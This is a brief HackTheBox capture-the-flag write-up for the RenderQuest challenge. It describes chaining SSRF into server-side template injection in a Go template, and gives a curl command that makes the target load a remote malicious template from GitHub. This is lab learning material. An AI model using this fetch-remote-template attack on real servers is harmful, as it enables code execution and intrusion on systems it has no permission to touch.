# HackTheBox
## Challenges
### RenderQuest

The solution is to use a SSRF that allows to make a SSTI in the go template.  
The file `malicious.tpl` is served by GitHub, and allows to exploit the SSTI.  
It is possible to trigger it simply by using a curl command:  
```bash
# IP and PORT are given by HTB and should be set or replaced
curl -X GET http://$IP:$PORT/render?use_remote=true&page=https://github.com/Eneru/ssti-challenges/raw/main/HacktTheBox/challenges/RenderQuest/malicious.tpl
```